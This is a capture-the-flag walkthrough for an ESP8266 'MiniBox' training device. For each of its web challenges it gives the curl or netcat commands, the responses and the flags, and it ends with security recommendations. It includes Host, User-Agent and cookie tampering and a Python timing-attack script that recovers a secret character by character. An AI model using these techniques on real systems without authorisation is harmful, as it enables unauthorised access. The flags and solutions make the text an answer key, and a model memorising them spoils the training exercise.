# MiniBox CTF Trainer Walkthrough

Welcome to the MiniBox CTF Trainer walkthrough! This guide will provide a step-by-step solution to each challenge implemented in the ESP8266 code, as well as explain how similar vulnerabilities can be found and exploited in real-life scenarios.

## Overview

The MiniBox is an ESP8266-based device that sets up a Wi-Fi access point and provides various web-based challenges. Participants connect to the Wi-Fi network and interact with the device's APIs to discover flags hidden within responses, headers, or behaviors.

### Setup Details

- **SSID**: MicroBox
- **Password**: 12345678
- **Default Credentials** (for some endpoints in **EASY** mode):
  - **Username**: admin
  - **Password**: password

### Difficulty Levels

- **EASY**: Default mode with standard challenges.
- **HARD**: Activated by holding down the button during startup. Hard mode introduces authentication and more complex challenges.

---

## Challenges

### 1. API LED Control Endpoint (`FLAG_1`)

**Endpoint**: `/api/led/on`

#### Discovery

1. **Enumerate Endpoints**: Use tools like **DirBuster**, **DirSearch**, or simply try common API endpoints manually.
2. **Observation**: Accessing `/api/led/on` returns a JSON response.

#### Solution

- **Access the Endpoint**:
  ```sh
  curl http://192.168.4.1/api/led/on
  ```
- **Response**:
  ```json
  {
    "message": "API LED is ON",
    "flag": "CTF{Mayb3_Th1s_1s_Th3_Fl4g}"
  }
  ```
- **Flag**: `CTF{Mayb3_Th1s_1s_Th3_Fl4g}`

#### Real-Life Scenario

- **Unsecured IoT Endpoints**: Devices exposing control endpoints without authentication can be manipulated by attackers.
- **Data Leakage**: Sensitive information (like flags or secrets) returned in responses.

---

### 2. Connected Clients Information (`FLAG_2`)

**Endpoint**: `/api/clients`

#### Discovery

1. **API Exploration**: After finding `/api/led/on`, check for other `/api/` endpoints.
2. **Access Endpoint**: Navigate to `/api/clients`.

#### Solution

- **Access the Endpoint**:
  ```sh
  curl http://192.168.4.1/api/clients
  ```
- **Response**:
  ```json
  {
    "client_count": 1,
    "clients": [
      {"mac": "AA:BB:CC:DD:EE:FF"}
    ],
    "flag": "CTF{May_the_flag_be_with_you}"
  }
  ```
- **Flag**: `CTF{May_the_flag_be_with_you}`

#### Real-Life Scenario

- **Privacy Concerns**: Devices revealing connected client information can lead to privacy breaches.
- **Network Mapping**: Attackers can map out connected devices for further exploitation.

---

### 3. Wi-Fi Network Scan (`FLAG_3`)

**Endpoint**: `/api/scan`

#### Discovery

1. **Continued API Enumeration**: Testing standard endpoints like `/api/scan`.
2. **Access Endpoint**: Navigate to `/api/scan`.

#### Solution

- **Access the Endpoint**:
  ```sh
  curl http://192.168.4.1/api/scan
  ```
- **Response**:
  ```json
  {
    "network_count": 5,
    "networks": [
      {"ssid": "Network1", "rssi": -40},
      // ...
    ],
    "flag": "CTF{Th3_Fl4g_1s_H3r3}"
  }
  ```
- **Flag**: `CTF{Th3_Fl4g_1s_H3r3}`

#### Real-Life Scenario

- **Information Disclosure**: Devices scanning and revealing nearby networks can aid attackers in identifying potential targets.
- **Regulatory Issues**: Unauthorized scanning may violate regulations in some jurisdictions.

---

### 4. Buzzer Control (`FLAG_5`)

**Endpoint**: `/api/buzzer/play`

#### Discovery

1. **API Exploration**: Testing endpoints related to hardware control.
2. **Access Endpoint**: Navigate to `/api/buzzer/play`.

#### Solution

- **Access the Endpoint**:
  ```sh
  curl http://192.168.4.1/api/buzzer/play
  ```
- **Response**:
  ```json
  {
    "message": "Buzzer tested",
    "flag": "CTF{The_Big_Daddy_Flag}"
  }
  ```
- **Flag**: `CTF{The_Big_Daddy_Flag}`

#### Real-Life Scenario

- **Unauthorized Access**: Controlling hardware components can lead to physical disruptions.
- **Security Risks**: Manipulating devices remotely without proper authentication.

---

### 5. Hash Validation Challenge (`FLAG_6`)

**Endpoint**: `/api/hashiklis`

#### Discovery

1. **Access the Endpoint**: Navigate to `/api/hashiklis`.
2. **Read the Hint**: The response provides a riddle.

#### Solution

- **Access the Endpoint**:
  ```sh
  curl http://192.168.4.1/api/hashiklis
  ```
- **Response**:
  ```json
  {
    "message": "In my world, 32 characters I be, the sum of my parts, a hash you'll see. Seek me out in the land of MD5, and send me back for a reply."
  }
  ```
- **Interpretation**:
  - The hint refers to an MD5 hash.
- **Generate an MD5 Hash**:
  - Use any string to generate an MD5 hash (32-character hexadecimal).
  - Example:
    ```sh
    echo -n "test" | md5sum
    ```
    Output: `098f6bcd4621d373cade4e832627b4f6`
- **Submit the Hash**:
  ```sh
  curl -X POST -d "plain=098f6bcd4621d373cade4e832627b4f6" http://192.168.4.1/api/hashiklis
  ```
- **Response**:
  ```json
  {
    "flag": "CTF{Noob_with_a_Flag}"
  }
  ```
- **Flag**: `CTF{Noob_with_a_Flag}`

#### Real-Life Scenario

- **Input Validation**: Systems that expect specific input formats can be tricked if validation is weak.
- **Hash Length Extension Attacks**: Understanding hash functions can help in exploiting cryptographic weaknesses.

---

### 6. Caesar Cipher Challenge (`FLAG_10`)

**Endpoint**: `/TimeNewRoman`

#### Discovery

1. **Endpoint Naming**: The endpoint name is a play on "Times New Roman", suggesting something with text.
2. **Access the Endpoint**.

#### Solution

- **Access the Endpoint**:
  ```sh
  curl http://192.168.4.1/TimeNewRoman
  ```
- **Response**:
  ```json
  {
    "ciphered_flag": "FWH{GRQW_WRXFK_PB_IODJ}"
  }
  ```
- **Decipher the Flag**:
  - Recognize it's a Caesar cipher with a shift.
  - Since `C` shifted by 3 becomes `F`, the shift is **+3**.
  - **Decipher using a tool or script**:
    ```sh
    echo "FWH{GRQW_WRXFK_PB_IODJ}" | tr 'A-Za-z' 'D-ZA-Cd-za-c'
    ```
  - **Deciphered Flag**: `CTF{DONT_TOUCH_MY_FLAG}`
- **Flag**: `CTF{DONT_TOUCH_MY_FLAG}`

#### Real-Life Scenario

- **Weak Encryption**: Simple ciphers are not secure but can be used to obfuscate data.
- **Cryptanalysis**: Understanding basic encryption helps in decrypting and analyzing secure communications.

---

### 7. Hidden UDP Broadcast (`FLAG_9`)

**Behavior**: The device broadcasts a UDP packet containing the flag.

#### Discovery

1. **Network Scanning**: Use tools like **Wireshark** to monitor network traffic.
2. **Observation**: Notice UDP packets being broadcasted to port **1337**.

#### Solution

- **Capture the UDP Packet**:
  - Start Wireshark or tcpdump on the interface connected to the MicroBox.
  - Filter for UDP traffic on port 1337:
    ```
    udp.port == 1337
    ```
- **Examine Packet Content**:
  - The UDP packet contains the flag: `CTF{Th3_Fl4g_1s_1n_Th3_C0d3}`

#### Real-Life Scenario

- **Eavesdropping**: Unencrypted broadcasts can be intercepted by attackers.
- **Information Leakage**: Sensitive data should not be transmitted over unsecured channels.

---

### 8. User-Agent Header Challenge (`FLAG_11`)

**Endpoint**: `/specialAgent`

#### Discovery

1. **Endpoint Guessing**: Try accessing endpoints that suggest special handling.
2. **Access Endpoint**: Navigate to `/specialAgent` and receive a 403 Forbidden message.

#### Solution

- **Modify User-Agent**:
  - The endpoint name suggests the need for a special `User-Agent`.
- **Send Request with Custom User-Agent**:
  ```sh
  curl -H "User-Agent: secret-agent" http://192.168.4.1/specialAgent
  ```
- **Response**:
  ```json
  {
    "flag": "CTF{UserAgent_Flag}"
  }
  ```
- **Flag**: `CTF{UserAgent_Flag}`

#### Real-Life Scenario

- **User-Agent Filtering**: Servers may provide different content based on the `User-Agent`.
- **Bypassing Controls**: Modifying headers can bypass simple security measures.

---

### 9. Cookie Challenge (`FLAG_12`)

**Endpoint**: `/cookieMonster`

#### Discovery

1. **Access Endpoint**: Navigate to `/cookieMonster` and observe the response.
2. **Response Indicates**: "Cookie required" and sets a cookie.

#### Solution

- **Inspect Cookies**:
  - The server sets `auth=challenge`.
- **Send Request with Modified Cookie**:
  - The goal is to change `auth` to `letmein`.
- **Send Request with Custom Cookie**:
  ```sh
  curl -H "Cookie: auth=letmein" http://192.168.4.1/cookieMonster
  ```
- **Response**:
  ```json
  {
    "flag": "CTF{Cookie_Monster_Flag}"
  }
  ```
- **Flag**: `CTF{Cookie_Monster_Flag}`

#### Real-Life Scenario

- **Session Hijacking**: Modifying cookies can grant unauthorized access.
- **Poor Authentication**: Relying solely on client-side data is insecure.

---

### 10. Host Header Challenge (`FLAG_17`)

**Endpoint**: `/hostSecret`

#### Discovery

1. **Access Endpoint**: Navigate to `/hostSecret` and receive a 403 Forbidden message.
2. **Consider Host Header Manipulation**.

#### Solution

- **Modify Host Header**:
  - The endpoint likely checks for a specific `Host` header.
- **Send Request with Custom Host**:
  ```sh
  curl -H "Host: secret.local" http://192.168.4.1/hostSecret
  ```
- **Response**:
  ```json
  {
    "flag": "CTF{Host_Header_Flag}"
  }
  ```
- **Flag**: `CTF{Host_Header_Flag}`

#### Real-Life Scenario

- **Host Header Attacks**: Manipulating the `Host` header can lead to cache poisoning or access to unintended content.
- **Virtual Host Misconfigurations**: Servers serving different content based on the `Host` header.

---

### 11. Timing Attack Challenge (`FLAG_18`)

**Endpoint**: `/timingAttack` (POST request)

#### Discovery

1. **Access Endpoint**: Observe that the server responds differently based on input timing.
2. **Suspect a Timing Attack Vulnerability**.

#### Solution

- **Understand the Challenge**:
  - The server delays response based on correct characters.
- **Automate the Attack**:
  - Write a script to measure response times for different inputs.
- **Example in Python**:

  ```python
  import requests
  import time

  url = "http://192.168.4.1/timingAttack"
  charset = "CTF{ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_}"
  discovered = ""

  while True:
      max_time = 0
      next_char = ''
      for c in charset:
          test_input = discovered + c
          start_time = time.time()
          response = requests.post(url, data={'input': test_input})
          elapsed = time.time() - start_time
          if elapsed > max_time:
              max_time = elapsed
              next_char = c
      discovered += next_char
      print(f"Discovered so far: {discovered}")
      if next_char == '}':
          break
  ```

- **Flag**: `CTF{Timing_Is_Everything}`

#### Real-Life Scenario

- **Timing Attacks**: Exploiting time differences in responses to extract sensitive information.
- **Cryptographic Weaknesses**: Systems not using constant-time operations are vulnerable.

---

### 12. Hex Encoding Challenge (`FLAG_16`)

**Endpoint**: `/superSecret`

#### Discovery

1. **Access Endpoint**: Navigate to `/superSecret`.
2. **Response Contains Hex Data**.

#### Solution

- **Access the Endpoint**:
  ```sh
  curl http://192.168.4.1/superSecret
  ```
- **Response**:
  ```json
  {
    "data": "4354467b4865785f4861636b65727d"
  }
  ```
- **Decode the Hex String**:
  ```sh
  echo "4354467b4865785f4861636b65727d" | xxd -r -p
  ```
- **Decoded Flag**: `CTF{Hex_Hacker}`

#### Real-Life Scenario

- **Data Encoding**: Sensitive data may be encoded in various formats.
- **Data Extraction**: Understanding encoding schemes aids in data recovery.

---

### 13. CAPTCHA Challenge (`FLAG_13`)

**Endpoint**: `/captcha`

#### Discovery

1. **Access Endpoint**: Navigate to `/captcha` and receive a math question.

#### Solution

- **Get the Question**:
  ```sh
  curl http://192.168.4.1/captcha
  ```
- **Response**:
  ```json
  {
    "question": "What is 7 + 3?"
  }
  ```
- **Calculate Answer**:
  - 7 + 3 = 10
- **Submit the Answer**:
  ```sh
  curl -X POST -d "answer=10" http://192.168.4.1/captcha
  ```
- **Response**:
  ```json
  {
    "flag": "CTF{Captcha_Cracked}"
  }
  ```
- **Flag**: `CTF{Captcha_Cracked}`

#### Real-Life Scenario

- **CAPTCHA Bypassing**: Simple CAPTCHAs can be bypassed with automation.
- **Bot Protection**: Implementing stronger CAPTCHAs or alternative verification methods.

---

### 14. UDP Packet Challenge (`FLAG_20`)

**Behavior**: Sending a specific UDP packet to receive a flag.

#### Discovery

1. **Port Scanning**: Notice that the device listens on UDP port **1337**.
2. **Attempt to Communicate**: Send data to the port and observe responses.

#### Solution

- **Send the Specific Packet**:
  ```sh
  echo -n "pleaseSendFlag" | nc -u -w1 192.168.4.1 1337
  ```
- **Receive the Response**:
  - The device sends back `CTF{UDP_Secret_Unveiled}`

- **Flag**: `CTF{UDP_Secret_Unveiled}`

#### Real-Life Scenario

- **Hidden Services**: Devices may have undocumented services listening on non-standard ports.
- **Service Enumeration**: Comprehensive scanning can reveal such hidden services.

---

### 15. Unauthenticated Access in Hard Mode (`FLAGS_4`, `FLAG_7`, `FLAG_8`, etc.)

**Behavior**: In **HARD** mode, certain information requires authentication.

#### Discovery

1. **Authentication Requirement**: Upon accessing certain endpoints, the server requests authentication.
2. **Brute Forcing Not Feasible**: Credentials are randomly generated.

#### Solution

- **Physical Access**: Since the device is in your possession, you can observe the display.
- **Read Credentials**:
  - The OLED display shows the username and password.
- **Use Credentials**:
  - Use the displayed credentials to authenticate.
- **Access Restricted Endpoints**:
  - Proceed to explore and find remaining flags.

#### Real-Life Scenario

- **Physical Security**: Devices should not display sensitive information.
- **Local Attacks**: Attackers with physical access can extract data from devices.

---

## Conclusion

This walkthrough demonstrates how to systematically approach and solve various challenges in the MiniBox CTF Trainer. In real-life scenarios, similar techniques can be employed by security professionals to test systems for vulnerabilities:

- **Enumeration**: Discovering available services, endpoints, and functionalities.
- **Manipulation**: Altering headers, cookies, and other request parameters.
- **Exploitation**: Leveraging vulnerabilities to gain unauthorized access or retrieve sensitive information.
- **Mitigation**: Understanding these vulnerabilities emphasizes the importance of implementing proper security measures.

---

## Security Recommendations

- **Authentication and Authorization**: Ensure all sensitive endpoints require proper authentication.
- **Input Validation**: Validate and sanitize all user inputs.
- **Secure Communication**: Use encryption (HTTPS) to protect data in transit.
- **Least Privilege**: Limit the information disclosed to what is necessary.
- **Regular Updates**: Keep firmware and software updated to patch known vulnerabilities.
- **Physical Security**: Prevent unauthorized physical access to devices.

---

By understanding and practicing these challenges, participants can improve their cybersecurity skills and apply them to protect real-world systems.